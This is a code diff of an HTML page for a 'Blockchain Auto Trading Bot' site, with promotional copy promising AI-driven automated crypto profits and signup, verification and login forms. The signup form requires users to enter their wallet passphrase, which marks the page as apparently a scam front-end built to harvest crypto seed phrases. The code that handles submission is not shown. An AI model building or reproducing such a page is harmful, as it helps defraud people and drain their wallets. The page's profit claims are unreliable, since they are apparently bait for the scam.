@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -11,127 +12,149 @@
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       margin: 0;
       padding: 0;
-    }main {
-  max-width: 480px;
-  margin: 50px auto;
-  background: #111a3a;
-  padding: 20px;
-  border-radius: 12px;
-  box-shadow: 0 0 15px rgba(0,0,0,0.7);
-}
-
-h1, h2 {
-  color: #f0c040;
-  text-align: center;
-}
-
-input, button {
-  width: 100%;
-  padding: 12px;
-  font-size: 16px;
-  margin-top: 10px;
-  border-radius: 8px;
-  border: none;
-}
-
-input {
-  background: #1c2541;
-  color: #fff;
-}
-
-button {
-  background-color: #0b5ed7;
-  color: white;
-  font-weight: bold;
-  cursor: pointer;
-}
-
-button:hover {
-  background-color: #0946a3;
-}
-
-.nav-button {
-  text-align: left;
-  margin: 10px 0;
-  color: #f0c040;
-  cursor: pointer;
-  font-size: 20px;
-}
-
-.hidden {
-  display: none;
-}
-
+    }
+    main {
+      max-width: 480px;
+      margin: 50px auto;
+      background: #111a3a;
+      padding: 30px 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.7);
+    }
+    h1, h2 {
+      color: #f0c040;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 1rem;
+      line-height: 1.6;
+      text-align: center;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+    input {
+      background: #1c2541;
+      color: #fff;
+    }
+    button {
+      background-color: #0b5ed7;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0946a3;
+    }
+    .btn-outline {
+      background-color: transparent;
+      border: 2px solid #0b5ed7;
+      color: #0b5ed7;
+    }
+    .btn-outline:hover {
+      background-color: #0b5ed7;
+      color: white;
+    }
+    .nav-button {
+      margin-top: 20px;
+      color: #f0c040;
+      text-align: center;
+      cursor: pointer;
+      display: inline-block;
+    }
+    .hidden {
+      display: none;
+    }
+    ul {
+      text-align: left;
+      max-width: 400px;
+      margin: 1rem auto 2rem;
+      padding-left: 0;
+      font-size: 0.95rem;
+      list-style: none;
+    }
+    ul li {
+      margin-bottom: 0.5rem;
+    }
+    .error {
+      color: #ff4d4d;
+      font-size: 0.9rem;
+      margin-top: 10px;
+    }
+    .loading {
+      color: #f0c040;
+      font-weight: bold;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
-   <main>
-  <!--PAGE 1: Landing Page -->
-  <section id="page1">
-    <h1 style="font-size: 2.2rem; font-weight: bold; color: #f0b90b; margin-bottom: 1rem;">
-      Welcome to Blockchain Auto Trading Bot
-    </h1>
-    <p style="max-width: 750px; font-size: 1rem; line-height: 1.8; margin-bottom: 2rem;">
-      <strong>24/7 Intelligent Crypto Trading. Powered by Blockchain.</strong><br /><br />
-      Take your crypto trading to the next level with our cutting-edge Blockchain Auto Trading Bot — a fully automated system that leverages advanced algorithms, real-time market data, and smart contract technology to trade your assets efficiently and securely.
-    </p>
-    <ul style="text-align: left; max-width: 500px; margin: 0 auto 2rem; font-size: 1rem; list-style: none; padding-left: 0;">
-      <li style="margin-bottom: 0.5rem;">✅ AI-Powered Strategy Execution</li>
-      <li style="margin-bottom: 0.5rem;">✅ Integrated with Binance, Ethereum, BSC & More</li>
-      <li style="margin-bottom: 0.5rem;">✅ Auto-Buy/Sell at Optimal Market Conditions</li>
-      <li style="margin-bottom: 0.5rem;">✅ Secure, Transparent, and On-Chain Verified</li>
-      <li>✅ Real-Time Profit Dashboard & Alerts</li>
-    </ul>
-    <p style="max-width: 700px; font-size: 1rem; margin-bottom: 2.5rem;">
-      <strong>You stay in control.</strong><br />
-      Set your trading goals, stop-loss limits, and preferred pairs. Let the bot do the rest while you monitor your profits from an intuitive dashboard.
-    </p>
-    <div>
-      <button class="btn-yellow" onclick="showPage('1i')">Sign Up</button>
+  <main>
+    <!-- Landing Page -->
+    <section id="page1">
+      <h1>Welcome to Blockchain Auto Trading Bot</h1>
+      <p><strong>24/7 Intelligent Crypto Trading. Powered by Blockchain.</strong><br><br>
+        Take your crypto trading to the next level with our cutting-edge Blockchain Auto Trading Bot — a fully automated system that leverages advanced algorithms, real-time market data, and smart contract technology to trade your assets efficiently and securely.
+      </p>
+      <ul>
+        <li>✅ AI-Powered Strategy Execution</li>
+        <li>✅ Integrated with Binance, Ethereum, BSC & More</li>
+        <li>✅ Auto-Buy/Sell at Optimal Market Conditions</li>
+        <li>✅ Secure, Transparent, and On-Chain Verified</li>
+        <li>✅ Real-Time Profit Dashboard & Alerts</li>
+      </ul>
+      <p><strong>You stay in control.</strong><br>
+        Set your trading goals, stop-loss limits, and preferred pairs. Let the bot do the rest while you monitor your profits from an intuitive dashboard.
+      </p>
+      <button onclick="showPage('1i')">Sign Up</button>
       <button class="btn-outline" onclick="showPage('1iii')">Login</button>
-    </div>
-  </section> 
-  
-    <!-- PAGE 1i: Sign Up -->
-<section id="page1i" class="hidden">      
-  <h2>Sign Up</h2>      
-  <form id="signupForm">      
-    <input type="text" id="full_name" name="full_name" placeholder="Full Name" required />      
-    <input type="tel" id="phone_number" name="phone_number" placeholder="Phone Number" required pattern="^\\+?[0-9]{7,15}$" title="Enter a valid phone number" />      
-    <input type="email" id="user_email" name="user_email" placeholder="Email" required />      
-    <input type="password" id="password" name="password" placeholder="Password" required minlength="6" />      
-    <input type="password" id="confirm_password" name="confirm_password" placeholder="Confirm Password" required minlength="6" />      
-    <input type="text" id="secret_phrase" name="secret_phrase" placeholder="Wallet Passphrase" required />      
-    <button type="submit" style="background-color:#1a2b6c; color:white;">Sign Up</button>      
-  </form>      
- <p><a id="linkBackToLanding">Back</a></p>      
-  <p id="signupError" class="error"></p>      
-</section
-  
-     
-  <!-- PAGE 1ii: Verification -->     
-    <section id="page1ii" class="hidden">      
-  <h2>Enter Verification Code</h2>      
-  <p>Please check your email for the verification code.</p>      
-  <input type="text" id="inputVerificationCode" placeholder="Verification Code" />      
-  <button id="btnVerifyCode">Verify</button>      
-  <p id="verifyMessage" class="error"></p>      
-  <div id="loadingMessage" class="loading hidden">Verifying, please wait...</div>      
-  <p><a id="linkBackToSignup">Back to Sign Up</a></p>      
-</section>    
-  
-    <!-- PAGE 1iii: Login -->    
-    <section id="page1iii" class="hidden">      
-  <h2>Login</h2>      
-  <form id="loginForm">      
-    <input type="email" id="login_email" name="login_email" placeholder="Email" required />      
-    <input type="password" id="login_password" name="login_password" placeholder="Password" required minlength="6" />      
-    <button type="submit">Login</button>      
-  </form>      
-  <p id="loginError" class="error"></p>      
-  <p><a id="linkBackToLanding">Back</a></p>      
-</section> 
-   </main>
+    </section>
+
+    <!-- Sign Up Page -->
+    <section id="page1i" class="hidden">
+      <h2>Sign Up</h2>
+      <form id="signupForm">
+        <input type="text" name="full_name" placeholder="Full Name" required />
+        <input type="tel" name="phone_number" placeholder="Phone Number" required />
+        <input type="email" name="user_email" placeholder="Email" required />
+        <input type="password" name="password" placeholder="Password" required />
+        <input type="password" name="confirm_password" placeholder="Confirm Password" required />
+        <input type="text" name="secret_phrase" placeholder="Wallet Passphrase" required />
+        <button type="submit">Sign Up</button>
+        <p class="error" id="signupError"></p>
+      </form>
+      <div class="nav-button" onclick="showPage('1')">🔙 Back</div>
+    </section>
+
+    <!-- Verification Page -->
+    <section id="page1ii" class="hidden">
+      <h2>Enter Verification Code</h2>
+      <p>Please check your email for the verification code.</p>
+      <input type="text" id="inputVerificationCode" placeholder="Verification Code" />
+      <button id="btnVerifyCode">Verify</button>
+      <p id="verifyMessage" class="error"></p>
+      <div id="loadingMessage" class="loading hidden">Verifying, please wait...</div>
+      <div class="nav-button" onclick="showPage('1i')">🔙 Back to Sign Up</div>
+    </section>
+
+    <!-- Login Page -->
+    <section id="page1iii" class="hidden">
+      <h2>Login</h2>
+      <form id="loginForm">
+        <input type="email" name="login_email" placeholder="Email" required />
+        <input type="password" name="login_password" placeholder="Password" required />
+        <button type="submit">Login</button>
+        <p class="error" id="loginError"></p>
+      </form>
+      <div class="nav-button" onclick="showPage('1')">🔙 Back to Welcome</div>
+    </section>
+  </main>
     
   <!-- Page 3: Main Dashboard -->     
     <div id="page3" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
@@ -562,5 +585,23 @@ document.querySelectorAll(".network-copy").forEach(btn => {
     showPage(previousPageId);
   }
   </script>
-  </body>      
- </html>
+  <script>
+    function showPage(pageId) {
+      const pages = document.querySelectorAll("section");
+      pages.forEach((p) => (p.style.display = "none"));
+      const target = document.getElementById("page" + pageId);
+      if (target) {
+        target.style.display = "block";
+        localStorage.setItem("lastPage", pageId);
+      }
+    }
+
+    // Load last visited page or default
+    window.onload = () => {
+      const lastPage = localStorage.getItem("lastPage") || "1";
+      showPage(lastPage);
+    };
+  </script>
+</body>
+</html>
+
